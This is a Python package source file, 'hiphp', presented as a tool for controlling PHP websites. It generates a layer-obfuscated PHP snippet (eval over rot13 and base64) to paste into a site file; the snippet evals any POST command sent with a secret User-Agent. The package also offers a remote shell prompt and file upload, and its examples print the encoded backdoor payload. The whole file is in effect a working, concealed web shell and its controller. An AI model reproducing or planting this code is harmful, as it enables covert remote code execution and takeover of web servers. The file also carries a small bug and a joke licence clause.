#!/usr/bin/env python
# coding:utf-8
"""
#set:usage.py,examples.py,changelog.txt
##################################################################
# USAGE :
#s
from hiphp import hiphp

p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False) #In order to print the result directly.
#p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>") #In order to make the result as a variable.
print(p1.get_code()) #Get HIPHP ID for first use.
p1.run("<YOUR_CODE>") #Run a code or line in your website.
p1.run_file("<PHP_CODE_FILE_PATH>") #Run a code or line in your website from a file.
p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>") #Run a code or line in your website from a file With the entry of variables.
p1.cli() #open command panel
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>") #Upload a file to the server hosting the site.
p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>")
#e
##################################################################
# EXAMPLES :
#s
from hiphp import hiphp

p1=hiphp("123","http://localhost/index.php",False)

# Example:1
# GET ID:
print(p1.get_code())
# OUTPUT:
'''
/*php code start*/
eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdUhJU09zSUlBU0h5OU9FMElCSVBxcUNHMGFaUUx3QlJEM0F3RDBBUlJsWndSbEIwRGtDR1pqWUd0MFdHRDVDbU4xQ1JaakpteDFybVNPWFFOMkJ3SVBuR1Zsb0hObFpRTzBEbU9uQkdEY1p3dTlEMFdxQkdEK0FtTnVEeFp4QXdOekR3RXNBbU5lQUhWa0VRTG1abVYxRHdwM1pSTDVXbHk3TUpBYm9scHdwVXkwblQ5aFdtZ2NNdnVjcDNBeXFQdHhLMU9DSDFFb1cyQWlvSjF1b3pEYUtGeGNyMkkyTEpqYldTOURHMUFISmxxd28yMWdMSjV4VzEwY0IzMXlyVHkwQjMwPQ==')))));
/*php code end*/
'''
# Copy this code into the file whose path you entered earlier.
# for example: https://localhost/index.php


# Example:2
# Command:
p1.run("echo 'this is a test';")
# OUTPUT:
'''
this is a test
'''

# Example:3
# Run code from file:
#-example_3.php content:
'''
echo 'this is a test';
'''
#OR
'''
<?php
    echo 'this is a test';
?>
'''
p1.run_file("example_3.php")
# OUTPUT:
'''
this is a test
'''

# Example:4
# Run code from file With the entry of variables:
#-example_4.php content:
'''
echo '__test__';
'''
#OR
'''
<?php
    echo '__test__';
?>
'''
p1.run_file("example_4.php","test==this is a test")
# OUTPUT:
'''
this is a test
'''

# Example:5
# Command line interface:
p1.cli()
# OUTPUT:
'''
hiphp>>>
'''

# Example:6
# Upload a picture:
p1.upload("picture_example.png")

# Example:7
# Upload a picture to a specific path:
p1.upload("picture_example.png","./pictures/")
#e
##################################################################
# CHANGELOG :
#s
## 0.1.10
- Fix Bugs.

## 0.1.9
 - fix bugs.
 
## 0.1.7
 - fix bugs.
 
## 0.1.6
 - fix bugs.
 - add upload to upload any file.
 - Simplify the use of the program.
 
## 0.1.5
 - fix bugs.
## 0.1.4
 - fix bugs.
 - new build.
 
## 0.1.1
 - Import pakages by pipincluder.
 - Fix bugs.
 
## 0.1.0
 - New build.
 - Fix bugs.
 
## 0.0.4
 - Fix bugs.
 
## 0.0.2
 - Fix bugs.
 - Add help list.
 - Add Executing from files.
 
## 0.0.1
 - First public release.
#e
##################################################################
"""
# VALUES :
__version__="0.1.10"
__name__="hiphp"
__author__="Yasser Bdj (Boudjada Yasser)"
__author_email__="yasser.bdj96@gmail.com"
__github_user_name__="yasserbdj96"
__title__="hiphp for control php websites."
__description__="A package for controlling a php-based website."
__author_website__=f"https://{__github_user_name__}.github.io/"
__source_code__=f"https://github.com/{__github_user_name__}/{__name__}"
__keywords__=[__github_user_name__,'python']
__keywords__.extend(__title__.split(" "))
__keywords__.extend(__description__.split(" "))
__install_requires__=["pipincluder",'requests','ashar','hexor']
__Installation__="pip install "+__name__+"=="+__version__
__license__='MIT License'
__copyright__='Copyright © 2008->Present, '+__author__+"."
__license_text__=f'''MIT License

{__copyright__}

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

You also agree that if you become very rich you will give me 1% of your wealth.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.'''
##################################################################
#s
from pipincluder import pipincluder

#import pakages by pipincluder:
exec(pipincluder("import requests",
                 "from ashar import ashar",
                 "from hexor import hexor",
                 "import re,base64,os").modules())

#start hiphp class:
class hiphp:
    #__init__:
    def __init__(self,key,url,returns=True):
        self.key=ashar(key,key).encode()
        self.url=url        
        self.headers={'User-Agent':self.key}
        self.print=hexor()
        self.print2=hexor(True)
        self.returns=returns
        
    #run:
    def run(self,command):
        if self.returns==True:
            return hiphp.do(self.url,self.headers,command,self.returns)
        else:
            hiphp.do(self.url,self.headers,command,self.returns)

    #cli:
    def cli(self):
        command=input('hiphp>>>')
        if command:
            hiphp.do(self.url,self.headers,command,self.returns)
        else:
            print(p1.c("Command not found!","#ff5b3c"))
        hiphp.cli(self)

    #run_file:
    def run_file(self,file,*opts):        
        try:
            open_file=open(file).read()
            if open_file[0:5]=="<?php":
                open_file=open_file[6:]
            if open_file[len(open_file)-2:len(open_file)]=="?>":
                open_file=open_file[:len(open_file)-2]
            for i in range(len(opts)):
                value,string=opts[i].split("==")
                open_file=open_file.replace(f"__{value}__",string)
            
            if self.returns==True:
                return hiphp.do(self.url,self.headers,open_file,self.returns)
            else:
                hiphp.do(self.url,self.headers,open_file,self.returns)
        except:
            self.print.c("The file you entered does not exist.","#ff5b3c")
            
    #upload:
    def upload(self,path_to_upluad,to=""):
        try:
            with open(path_to_upluad,"rb") as base64_file:
                encoded_string=base64.b64encode(base64_file.read())
            if to!="":
                hiphp.run(self,"if(!file_exists('"+to+"')){mkdir('"+to+"',0777,true);}")
            hiphp.run(self,f'Fwrite(fopen("{to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string.decode("utf-8")}"));')
        except:
            self.print.c(f"We could not read the file {path_to_upluad}","#ff5b3c")
    #do:
    def do(url,headers,command,returns):
        response=requests.post(url,headers=headers)
        if response.status_code==200:
            if response.text[0:7]=="#python":
                ploads={'command':command}#open('php.php').read()
                response=requests.post(url,headers=headers,data=ploads)
                if returns==True:
                    return hiphp.check_errors(response.text[7:],returns)
                else:
                    hiphp.check_errors(response.text[7:],returns)
            else:
                hexor().c("We were unable to recognize the hiphp identifier.","#ff5b3c")
        else:
            hexor().c("We were unable to connect '"+url+"'.","#ff5b3c")
        
    #check_errors:
    def check_errors(response,returns):
        if response[:6]!="<br />":
            if returns==True:
                return response
            else:
                print(response)
        else:
            result=re.search('on line <b>(.*)</b><br />',response)
            hexor().c(f"ERROR in line {result.group(1)}.","#ff5b3c")
            print(response.replace('<br />','').replace('<b>','').replace('</b>',''))

    #torot13:
    def rot13(text):
        rot13=str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
        return str.translate(text,rot13)

    #Get_code:
    def get_code(self):
        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#python';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=hiphp.rot13(code)
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode('{code}')))));"
        return self.print2.c("/*php code start*/\n","#31ad22")+self.print2.c(code,"#539bf5")+self.print2.c("\n/*php code end*/","#31ad22")
#e